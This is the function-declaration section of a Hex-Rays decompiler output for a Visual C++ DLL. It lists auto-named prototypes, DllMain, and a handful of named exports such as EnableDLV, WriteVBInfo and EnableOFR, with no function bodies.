/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// _DWORD *__usercall sub_10001000@<eax>(_DWORD *result@<eax>);
_DWORD *__stdcall sub_1000102B(_DWORD *a1);
void *__thiscall sub_1000105A(void *Block, char a2);
_DWORD *__stdcall sub_10001077(_DWORD *a1);
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
int sub_10001135();
LONG sub_10001201();
LONG __cdecl sub_100012A7(int a1, FILETIME *a2);
// bool __usercall sub_10001339@<al>(unsigned int *a1@<edi>, int a2);
unsigned __int8 __cdecl sub_10001429(_DWORD *a1, int a2, int a3, _DWORD *a4, int a5, unsigned int a6, _DWORD *a7);
_DWORD *__stdcall sub_10001520(_DWORD *a1);
_DWORD *__stdcall sub_10001553(_DWORD *a1);
_DWORD *__thiscall sub_10001577(_DWORD *Block, char a2);
void __thiscall sub_10001594(void *this, int a2);
void __thiscall sub_100015D8(void *this);
// _DWORD *__usercall sub_10001611@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_10001651(void *this);
// _DWORD *__userpurge sub_1000168A@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100016CE(void *this);
void __thiscall sub_10001707(void *this);
// char *__usercall sub_10001743@<eax>(char *a1@<eax>);
char *__thiscall sub_10001761(char *Block, char a2);
// char *__usercall sub_100017AA@<eax>(char *a1@<eax>);
// void __usercall sub_100017C8(int a1@<esi>);
// _DWORD *__userpurge sub_100017F0@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10001834(void *this);
// void __usercall sub_1000186D(int a1@<esi>);
// void __usercall sub_10001895(int a1@<esi>);
// void __usercall sub_100018BD(int a1@<esi>);
// void __usercall sub_100018F6(int a1@<esi>);
int __cdecl sub_1000191E(_DWORD *a1, _DWORD *a2, int a3, char *a4);
// _DWORD *__userpurge sub_10001AA3@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// _DWORD *__userpurge sub_10001AD6@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
void *__stdcall sub_10001B27(int a1);
LONG __stdcall sub_10001B5C(int *a1);
int __stdcall sub_10001B80(int a1, char a2, int a3);
int *__thiscall sub_10001BED(int *Block, char a2);
void __thiscall sub_10001C09(int *this);
int sub_10001C47();
void *__thiscall sub_10001C4B(_DWORD *this, int *a2);
LONG __stdcall sub_10001FCC(int *a1);
char __thiscall sub_10002000(_BYTE *this, int a2, int a3);
// HWND __usercall sub_10002070@<eax>(int a1@<eax>, int a2@<ecx>);
bool __stdcall sub_100020A4(int a1);
// char __userpurge sub_100020C4@<al>(__int32 a1@<eax>, _DWORD *a2@<edi>, _DWORD *a3);
int __thiscall sub_10002100(_DWORD *this, int a2);
char __cdecl sub_10002122(int a1, int a2, int a3, int a4, int a5);
// int __usercall sub_100021E3@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10002214(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10002271(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100022CE(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10002333(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10002398(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10002417(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_10002496(_DWORD *this);
int __thiscall sub_100024C0(void *this, int a2);
int *__thiscall sub_100024F3(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10002566(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_100025D9(void *this, int a2);
void __thiscall sub_10002617(void *this, int a2, int a3);
void __thiscall sub_10002658(void *this, int a2);
int __thiscall sub_10002696(void *this, int a2);
int __thiscall sub_100026DA(void *this, int a2);
void __thiscall sub_1000271E(void *this);
void *__thiscall sub_1000276C(_DWORD *this);
_DWORD *__thiscall sub_100027B0(_DWORD *this, int a2);
_DWORD *__thiscall sub_10002805(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000283E(_DWORD *Block, char a2);
// void *__usercall sub_1000285A@<eax>(void *a1@<esi>);
_DWORD *__thiscall sub_1000286A(_DWORD *Block, char a2);
void *__stdcall sub_10002886(int a1);
// int __usercall sub_100028B5@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100028F0(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10002928(_DWORD *this);
bool __thiscall sub_10002952(int this);
BOOL __thiscall sub_10002969(_DWORD *this);
int __thiscall sub_10002973(int this);
int __thiscall sub_100029AE(int this);
int __thiscall sub_100029E4(_DWORD *this);
int __thiscall sub_10002A0C(int this);
int __thiscall sub_10002A47(int this, int a2);
_DWORD *__thiscall sub_10002A60(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10002A98(_DWORD *this);
bool __thiscall sub_10002AC2(int this);
BOOL __thiscall sub_10002AD9(_DWORD *this);
int __thiscall sub_10002AE3(int this);
int __thiscall sub_10002B1E(int this);
int __thiscall sub_10002B54(_DWORD *this);
int __thiscall sub_10002B7C(int this);
int __thiscall sub_10002BB7(int this, int a2);
_DWORD *__thiscall sub_10002BD0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10002BEC(_DWORD *Block, char a2);
// int *__usercall sub_10002C25@<eax>(int *a1@<eax>, int *a2@<edi>);
// _DWORD *__userpurge sub_10002C48@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
int *__thiscall sub_10002C9C(int *this, int *a2);
void *__thiscall sub_10002CF0(_DWORD *this);
int __thiscall sub_10002D62(_DWORD *this);
int *__thiscall sub_10002D66(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10002DD6(int *this, int a2);
int __thiscall sub_10002DEE(_DWORD *this, unsigned int a2);
int __thiscall sub_10002E4B(_DWORD *this, int a2);
int __thiscall sub_10002E69(_DWORD *this, int a2);
void __thiscall sub_10002E87(_DWORD *this, unsigned int a2);
int __thiscall sub_10002EBF(int *this);
BOOL __thiscall sub_10002EF8(void *this);
int __thiscall sub_10002F03(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10002F4E(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10002FC0(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10002FE8(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10002FF9(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_100030B0(_DWORD *this);
// int __userpurge sub_100031D1@<eax>(__int32 a1@<eax>, int a2);
// _DWORD *__userpurge sub_100031F7@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000323B(void *this);
// _DWORD *__userpurge sub_1000328E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100032D2(void *this);
_DWORD *__thiscall sub_10003311(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000332D(_DWORD *this);
// char *__usercall sub_10003339@<eax>(char *a1@<eax>);
_DWORD *__stdcall sub_10003357(_DWORD *a1);
// LONG __usercall sub_10003386@<eax>(int *a1@<esi>);
// _DWORD *__userpurge sub_100033DA@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000341E(void *this);
// int __usercall sub_10003457@<eax>(__int32 a1@<eax>);
// void __usercall sub_1000352A(int a1@<esi>);
// void __usercall sub_10003564(int a1@<esi>);
// void __usercall sub_10003597(int a1@<esi>);
_DWORD *__stdcall sub_100035EA(_DWORD *a1, int a2, int a3);
LONG __stdcall sub_100039E1(int *a1);
void __stdcall sub_10003A3D(_DWORD *a1);
void __stdcall sub_10003A8D(_DWORD *a1);
_DWORD *__stdcall sub_10003AC0(_DWORD *a1, unsigned int a2);
void __thiscall sub_10003B09(void *this);
void __thiscall sub_10003B42(void *this);
void __thiscall sub_10003B7B(void *this);
// _DWORD *__usercall sub_10003BB4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__userpurge sub_10003BC8@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10003C0C(void *this);
// void __usercall sub_10003C48(_DWORD *a1@<edi>, unsigned int a2@<esi>);
// void __usercall sub_10003CB5(int a1@<esi>);
// void __usercall sub_10003CDD(int a1@<esi>);
// void __usercall sub_10003D05(int a1@<esi>);
// void __usercall sub_10003D3F(int a1@<esi>);
int __cdecl EnableDLV(_DWORD *a1);
int DisableDLV();
int __stdcall sub_10003E6D(_DWORD *a1);
int __stdcall RestoreSMLData(int a1);
LONG sub_10004116();
_DWORD *__thiscall sub_1000415A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100041B7(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10004214(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10004279(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100042DE(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1000435D(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_100043DC(_DWORD *this);
int *__thiscall sub_10004406(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10004479(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_100044EC(void *this, int a2);
void __thiscall sub_1000452A(void *this, int a2, int a3);
void __thiscall sub_1000456B(void *this, int a2);
int __thiscall sub_100045A9(void *this, int a2);
int __thiscall sub_100045ED(void *this, int a2);
void __thiscall sub_10004631(void *this);
_DWORD *__thiscall sub_10004686(_DWORD *Block, char a2);
// int __usercall sub_100046E1@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10004721@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10004752(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1000478A(_DWORD *this);
bool __thiscall sub_100047B4(int this);
BOOL __thiscall sub_100047CB(_DWORD *this);
int __thiscall sub_100047D5(int this);
int __thiscall sub_10004810(int this);
int __thiscall sub_10004846(_DWORD *this);
int __thiscall sub_1000486E(int this);
int __thiscall sub_100048A9(int this, int a2);
_DWORD *__thiscall sub_100048C2(void *this, _DWORD *a2, int a3);
void *__thiscall sub_100048FA(_DWORD *this);
bool __thiscall sub_10004924(int this);
BOOL __thiscall sub_1000493B(_DWORD *this);
int __thiscall sub_10004945(int this);
int __thiscall sub_10004980(int this);
int __thiscall sub_100049B6(_DWORD *this);
int __thiscall sub_100049DE(int this);
int __thiscall sub_10004A19(int this, int a2);
_DWORD *__thiscall sub_10004A32(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10004A4E(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10004A8B(_DWORD *a1);
int *__thiscall sub_10004AC3(int *this, int *a2);
void *__thiscall sub_10004B05(_DWORD *this);
int __thiscall sub_10004B66(_DWORD *this);
_DWORD *__thiscall sub_10004B6A(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10004BD0(int *this, int a2);
int __thiscall sub_10004BE8(_DWORD *this, unsigned int a2);
int __thiscall sub_10004C3F(_DWORD *this, int a2);
int __thiscall sub_10004C5D(_DWORD *this, int a2);
char *__thiscall sub_10004C7B(_DWORD *this, char *a2);
int __thiscall sub_10004CA1(int *this);
BOOL __thiscall sub_10004CC8(void *this);
int __thiscall sub_10004CD3(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10004D1D(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10004D8F(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10004DB7(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10004DC8(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10004E78(_DWORD *this);
// _DWORD *__userpurge sub_10004FA2@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10004FE6(void *this);
// _DWORD *__userpurge sub_10005039@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000507D(void *this);
_DWORD *__thiscall sub_100050BC(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100050D8(_DWORD *this);
_DWORD *__stdcall sub_100050E4(_DWORD *a1);
// _DWORD *__usercall sub_10005113@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_10005138(_DWORD *a1@<edi>);
// void __usercall sub_100051BC(int a1@<esi>);
// void __usercall sub_100051F6(int a1@<esi>);
_DWORD *__stdcall sub_1000524E(_DWORD *a1);
_DWORD *__thiscall sub_10005338(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10005354(_DWORD *a1);
_DWORD *__thiscall sub_10005390(_DWORD *Block, char a2);
void *__thiscall sub_100053D0(_DWORD *this);
_DWORD *__thiscall sub_100053F9(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10005456(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100054B3(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10005518(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000557D(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_100055FC(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1000567B(_DWORD *this);
int *__thiscall sub_100056A5(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10005718(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000578B(void *this, int a2);
void __thiscall sub_100057C9(void *this, int a2, int a3);
void __thiscall sub_1000580A(void *this, int a2);
int __thiscall sub_10005848(void *this, int a2);
int __thiscall sub_1000588C(void *this, int a2);
void __thiscall sub_100058D0(void *this);
_DWORD *__thiscall sub_10005925(_DWORD *Block, char a2);
// int __usercall sub_10005980@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_100059C0@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100059F1(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10005A29(_DWORD *this);
bool __thiscall sub_10005A53(int this);
BOOL __thiscall sub_10005A6A(_DWORD *this);
int __thiscall sub_10005A74(int this);
int __thiscall sub_10005AAF(int this);
int __thiscall sub_10005AE5(_DWORD *this);
int __thiscall sub_10005B0D(int this);
int __thiscall sub_10005B48(int this, int a2);
_DWORD *__thiscall sub_10005B61(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10005B99(_DWORD *this);
bool __thiscall sub_10005BC3(int this);
BOOL __thiscall sub_10005BDA(_DWORD *this);
int __thiscall sub_10005BE4(int this);
int __thiscall sub_10005C1F(int this);
int __thiscall sub_10005C55(_DWORD *this);
int __thiscall sub_10005C7D(int this);
int __thiscall sub_10005CB8(int this, int a2);
_DWORD *__thiscall sub_10005CD1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10005CED(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10005D27(_DWORD *a1);
int *__thiscall sub_10005D5F(int *this, int *a2);
void *__thiscall sub_10005DA1(_DWORD *this);
int __thiscall sub_10005E02(_DWORD *this);
_DWORD *__thiscall sub_10005E06(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10005E6C(int *this, int a2);
int __thiscall sub_10005E84(_DWORD *this, unsigned int a2);
int __thiscall sub_10005EDB(_DWORD *this, int a2);
int __thiscall sub_10005EF9(_DWORD *this, int a2);
char *__thiscall sub_10005F17(_DWORD *this, char *a2);
int __thiscall sub_10005F3D(int *this);
BOOL __thiscall sub_10005F64(void *this);
int __thiscall sub_10005F6F(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10005FB9(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1000602B(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10006053(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10006064(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10006114(_DWORD *this);
// _DWORD *__userpurge sub_1000623E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10006282(void *this);
// _DWORD *__userpurge sub_100062D5@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10006319(void *this);
_DWORD *__thiscall sub_10006358(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10006374(_DWORD *this);
_DWORD *__stdcall sub_10006380(_DWORD *a1);
// _DWORD *__usercall sub_100063AF@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_100063D4(_DWORD *a1@<edi>);
// void __usercall sub_10006458(int a1@<esi>);
// void __usercall sub_10006492(int a1@<esi>);
LONG __stdcall sub_100064EA(int *a1);
int WriteVBInfo();
int ReadVBInfo();
int __stdcall sub_100065C0(int a1);
int __stdcall sub_10006667(_DWORD *a1);
void __stdcall sub_1000690F(int *a1);
LONG sub_1000695E();
// _DWORD *__userpurge sub_100069E1@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10006A25(void *this);
// _DWORD *__usercall sub_10006A5E@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__userpurge sub_10006A72@<eax>(_DWORD *a1@<esi>, int a2);
// void __usercall sub_10006AC8(int a1@<esi>);
char __thiscall sub_10006B51(__int16 *this, int a2);
_DWORD *__thiscall sub_10006EE8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10006F45(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10006FA2(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10007007(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000706C(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_100070EB(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1000716A(_DWORD *this);
int *__thiscall sub_10007194(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10007207(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000727A(void *this, int a2);
void __thiscall sub_100072B8(void *this, int a2, int a3);
void __thiscall sub_100072F9(void *this, int a2);
int __thiscall sub_10007337(void *this, int a2);
int __thiscall sub_1000737B(void *this, int a2);
void __thiscall sub_100073BF(void *this);
_DWORD *__thiscall sub_10007414(_DWORD *Block, char a2);
// int __usercall sub_1000746F@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_100074AF@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_100074E0(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10007518(_DWORD *this);
bool __thiscall sub_10007542(int this);
BOOL __thiscall sub_10007559(_DWORD *this);
int __thiscall sub_10007563(int this);
int __thiscall sub_1000759E(int this);
int __thiscall sub_100075D4(_DWORD *this);
int __thiscall sub_100075FC(int this);
int __thiscall sub_10007637(int this, int a2);
_DWORD *__thiscall sub_10007650(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10007688(_DWORD *this);
bool __thiscall sub_100076B2(int this);
BOOL __thiscall sub_100076C9(_DWORD *this);
int __thiscall sub_100076D3(int this);
int __thiscall sub_1000770E(int this);
int __thiscall sub_10007744(_DWORD *this);
int __thiscall sub_1000776C(int this);
int __thiscall sub_100077A7(int this, int a2);
_DWORD *__thiscall sub_100077C0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100077DC(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10007816(_DWORD *a1);
void **__thiscall sub_10007851(void **this, void **a2);
void *__thiscall sub_10007890(int this);
int __thiscall sub_100078EE(_DWORD *this);
int __thiscall sub_100078F2(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1000794D(int *this, int a2);
int __thiscall sub_10007965(_DWORD *this, unsigned int a2);
int __thiscall sub_100079AE(_DWORD *this, int a2);
int __thiscall sub_100079CC(_DWORD *this, int a2);
void __thiscall sub_100079EA(_DWORD *this, unsigned int a2);
int __thiscall sub_10007A0C(void **this);
BOOL __thiscall sub_10007A30(void *this);
int __thiscall sub_10007A3B(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10007A7A(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10007AEC(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10007B14(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10007B25(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10007B82(_DWORD *this);
// _DWORD *__userpurge sub_10007C4C@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10007C90(void *this);
// _DWORD *__userpurge sub_10007CE3@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10007D27(void *this);
void *__thiscall sub_10007D66(void *Block, char a2);
_DWORD *__stdcall sub_10007D82(_DWORD *a1);
// void *__usercall sub_10007DB1@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
// void __usercall sub_10007DE3(int a1@<esi>);
// void __usercall sub_10007E1D(int a1@<esi>);
_DWORD *__stdcall sub_10007E5A(_DWORD *a1, int a2, int a3, int a4, int a5);
int *__thiscall sub_10007EB0(int *Block, char a2);
void __thiscall sub_10007ECC(int *this);
int sub_10007F07();
void *__thiscall sub_10007F0B(DWORD *this, _DWORD *a2);
_DWORD *__stdcall sub_10008064(_DWORD *a1);
_DWORD *__thiscall sub_10008189(_DWORD *Block, char a2);
void *__thiscall sub_100081A5(_DWORD *this);
_DWORD *__stdcall sub_100081CE(_DWORD *a1);
int *__thiscall sub_10008218(int *Block, char a2);
LONG __thiscall sub_10008234(int *this);
_DWORD *__stdcall sub_10008270(_DWORD *a1, _DWORD *a2);
int __stdcall sub_10008344(_DWORD *a1, int a2);
_DWORD *__stdcall sub_100083EF(int a1, _DWORD *a2);
int __thiscall sub_10008429(_DWORD *this, int a2);
// int *__usercall sub_10008463@<eax>(int a1@<eax>, int a2@<ecx>);
int __cdecl EnableSHR(_DWORD *a1);
int DisableSHR();
void *__thiscall sub_10008601(_DWORD *this);
_DWORD *__thiscall sub_10008645(_DWORD *Block, char a2);
// void *__usercall sub_10008661@<eax>(void *a1@<esi>);
int __stdcall sub_10008671(int a1);
int sub_10008683();
int __stdcall sub_10008725(_DWORD *a1);
int __stdcall GetSML(int a1);
LONG sub_100089B0();
LONG __stdcall sub_100089F4(int *a1);
int __stdcall CreateABHList(int a1);
int __stdcall FreeABHData(int a1);
int __stdcall sub_10008ACE(int a1);
int __stdcall sub_10008B28(_DWORD *a1);
LONG sub_10008DD8();
// UINT __usercall sub_10008E70@<eax>(OLECHAR ***a1@<eax>);
// LONG __usercall sub_10008E98@<eax>(volatile LONG *a1@<esi>);
// void __usercall sub_10008ED6(int a1@<eax>);
void *__thiscall sub_10008F07(_DWORD *this);
_DWORD *__thiscall sub_10008F63(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10008F7F(int *this, _DWORD *a2);
char __thiscall sub_10008FF4(_DWORD **this);
int __cdecl sub_10009121(int a1, int a2, void **a3);
int __thiscall sub_1000917E(_DWORD **this, int a2);
char __thiscall sub_100094DC(_DWORD **this);
int __thiscall sub_10009564(_DWORD *this, int a2);
char sub_100096B8();
int __thiscall sub_100096BB(_DWORD *this, int a2);
void __thiscall sub_10009742(void *this);
void __thiscall sub_1000977E(void *this);
// _DWORD *__usercall sub_100097B7@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_100097E7(int a1@<esi>);
// void __usercall sub_10009821(int a1@<esi>);
char __thiscall sub_10009853(_DWORD *this, char a2);
int __stdcall sub_1000999B(int a1, char a2);
int __stdcall sub_100099CF(int a1, char a2);
int __stdcall sub_10009A01(int a1);
_DWORD *__stdcall sub_10009A39(_DWORD *a1, int a2, int a3);
int sub_10009A89();
_DWORD *__stdcall sub_10009A93(_DWORD *a1, int a2, int a3);
int sub_10009AE3();
int sub_10009AFA();
_DWORD *__stdcall sub_10009AFE(_DWORD *a1, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_10009B50(_DWORD *Block, char a2);
LONG __stdcall sub_10009B74(_DWORD *a1);
void __thiscall sub_10009BA7(int **this, unsigned __int8 (__thiscall ***a2)(_DWORD), volatile LONG *lpAddend);
void __thiscall sub_10009C67(int **this, unsigned __int8 (__thiscall ***a2)(_DWORD), volatile LONG *lpAddend);
char sub_10009D27();
void __thiscall sub_10009D2A(int **this, int a2, int a3);
int __stdcall sub_10009DE6(char *a1);
_DWORD *__stdcall sub_10009ED7(_DWORD *a1);
_DWORD *__stdcall sub_10009F0F(_DWORD *a1);
_DWORD *__stdcall sub_10009F47(_DWORD *a1);
BOOL __thiscall sub_10009F5D(void *this);
void *__thiscall sub_10009F6C(_DWORD *this);
void *__thiscall sub_10009FD1(void *this, int a2);
void *__thiscall sub_10009FE3(void *this, int a2);
int __thiscall sub_10009FF5(_DWORD *this);
_DWORD *__thiscall sub_10009FF9(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000A059(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000A0B9(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000A119(int *this, _DWORD *a2);
void *__thiscall sub_1000A179(_DWORD *this);
int *__thiscall sub_1000A1A3(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1000A216(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000A289(void *this, int a2);
void __thiscall sub_1000A2C7(void *this, int a2, int a3);
void __thiscall sub_1000A308(void *this, int a2);
int __thiscall sub_1000A346(void *this, int a2);
int __thiscall sub_1000A38A(void *this, int a2);
void __thiscall sub_1000A3CE(void *this);
_DWORD *__thiscall sub_1000A423(_DWORD *Block, char a2);
// void *__usercall sub_1000A43F@<eax>(void *a1@<esi>);
_DWORD *__thiscall sub_1000A44F(_DWORD *Block, char a2);
LONG __stdcall sub_1000A4A5(int a1);
LONG __stdcall sub_1000A4C9(int a1);
// void __usercall sub_1000A4F0(int a1@<ecx>, int a2@<edi>);
// int __usercall sub_1000A55A@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1000A59A@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1000A5CB(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_1000A609(_DWORD *this);
BOOL __thiscall sub_1000A633(_DWORD *this);
BOOL __thiscall sub_1000A63C(_DWORD *this);
int __thiscall sub_1000A645(_DWORD *this);
int __thiscall sub_1000A669(_DWORD *this);
int __thiscall sub_1000A696(_DWORD *this);
void __thiscall sub_1000A6C3(_DWORD *this);
_DWORD *__thiscall sub_1000A742(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000A7CF(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_1000A80D(_DWORD *this);
BOOL __thiscall sub_1000A837(_DWORD *this);
BOOL __thiscall sub_1000A840(_DWORD *this);
int __thiscall sub_1000A849(_DWORD *this);
int __thiscall sub_1000A86D(_DWORD *this);
int __thiscall sub_1000A89A(_DWORD *this);
void __thiscall sub_1000A8C7(_DWORD *this);
_DWORD *__thiscall sub_1000A946(_DWORD *this, _DWORD *a2);
void __thiscall sub_1000A9D3(void *this);
_DWORD *__thiscall sub_1000A9F6(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1000AA12(_DWORD *a1, _DWORD *a2);
_DWORD *__thiscall sub_1000AA4F(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1000AA81(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7);
// _DWORD *__userpurge sub_1000AAD3@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000AB17(void *this);
// _DWORD *__usercall sub_1000AB50@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__userpurge sub_1000AB64@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__usercall sub_1000ABA8@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__usercall sub_1000ABCD@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1000AC0D(void *this);
// _DWORD *__userpurge sub_1000AC5A@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000AC9E(void *this);
// _DWORD *__usercall sub_1000ACD7@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__usercall sub_1000AD10@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1000AD50(void **this);
// _DWORD *__userpurge sub_1000ADAD@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000ADF1(void *this);
// _DWORD *__userpurge sub_1000AE44@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000AE88(void *this);
// char *__usercall sub_1000AEC7@<eax>(char *a1@<eax>);
void __thiscall sub_1000AEE5(void *this);
// char *__usercall sub_1000AF08@<eax>(char *a1@<eax>);
// char *__usercall sub_1000AF26@<eax>(char *a1@<eax>);
// void __usercall sub_1000AF44(int a1@<esi>);
// void __usercall sub_1000AF7E(int a1@<esi>);
// void __usercall sub_1000AFB8(int a1@<esi>);
// _DWORD *__usercall sub_1000AFE0@<eax>(int a1@<ecx>, int a2@<edi>);
// void __usercall sub_1000B03C(void **a1@<esi>);
// void __usercall sub_1000B072(int a1@<esi>);
// void __usercall sub_1000B0AC(int a1@<esi>);
int __cdecl EnableOFR(int a1, int a2, int a3, char a4, int a5, int a6, char a7, int a8, int a9, char a10, int a11, int a12, int a13, int a14, char a15, int a16, int a17, char a18, int a19, int a20, int a21, void *a22, char a23, int a24, char a25, int a26, int a27, int a28, int a29, int a30);
